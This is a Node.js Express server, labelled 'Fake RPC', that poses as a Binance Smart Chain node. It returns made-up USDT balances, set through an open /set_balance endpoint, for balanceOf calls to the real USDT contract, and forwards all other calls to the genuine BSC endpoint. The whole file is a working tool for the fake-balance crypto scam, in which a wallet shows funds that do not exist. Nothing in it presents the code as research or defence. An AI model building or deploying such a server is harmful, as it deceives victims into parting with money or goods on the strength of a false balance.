const express = require("express");
const bodyParser = require("body-parser");
const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.json());

let balances = {};

app.post("/set_balance", (req, res) => {
  const { wallet, value } = req.body;
  balances[wallet.toLowerCase()] = value;
  return res.json({ ok: true });
});

app.post("/", (req, res) => {
  const { method, params } = req.body;

  // fake balanceOf for real USDT
  if (
    method === "eth_call" &&
    params &&
    params[0] &&
    params[0].to &&
    params[0].to.toLowerCase() === "0x55d398326f99059ff775485246999027b3197955"
  ) {
    const addressHex = "0x" + params[0].data.slice(-40).toLowerCase();
    const balance = balances[addressHex] || "0";

    const fakeHex = "0x" + BigInt(balance + "000000000000000000").toString(16);
    return res.json({ result: fakeHex });
  }

  // forward other calls to real BSC
  fetch("https://bsc-dataseed.binance.org", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(req.body),
  })
    .then((r) => r.json())
    .then((r) => res.json(r))
    .catch(() => res.status(500).send("error"));
});

app.listen(PORT, () => console.log("Fake RPC running on port", PORT));
